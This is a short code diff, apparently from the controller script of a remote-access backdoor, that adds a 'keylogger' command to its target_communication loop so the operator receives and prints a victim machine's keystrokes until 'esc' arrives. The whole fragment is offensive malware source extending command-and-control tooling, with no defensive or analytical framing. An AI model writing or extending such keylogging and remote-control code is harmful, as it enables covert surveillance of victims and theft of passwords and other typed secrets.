@@ -85,6 +85,13 @@ def target_communication():
         elif command[:6] == 'upload':
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
+        elif command == 'keylogger':
+            while True:
+                keystroke = reliable_recv()
+                print(keystroke)
+                if keystroke == "esc":
+                    break
+            
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
